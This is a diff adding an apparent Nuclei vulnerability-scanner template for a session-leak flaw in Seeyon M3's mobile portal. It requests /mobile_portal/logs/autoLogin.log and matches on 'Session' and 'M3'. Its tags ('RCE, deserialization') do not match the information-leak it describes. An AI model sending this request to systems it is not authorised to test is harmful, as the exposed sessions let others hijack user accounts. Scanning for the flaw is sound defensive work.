@@ -1,0 +1,33 @@
+id: zyM3-mobile_portal-info-leak
+
+info:
+  name: 致远M3敏感信息泄露漏洞
+  author: Ashro
+  severity: critical
+  description: 该漏洞允许攻击者通过/mobile_portal/logs/autoLogin.log获取用户session
+  reference:
+  tags: RCE, deserialization, exploit
+
+requests:
+  - raw:
+      - |
+        GET /mobile_portal/logs/autoLogin.log HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36
+        Accept-Charset: utf-8
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "Session"
+
+      - type: word
+        words:
+          - "M3"
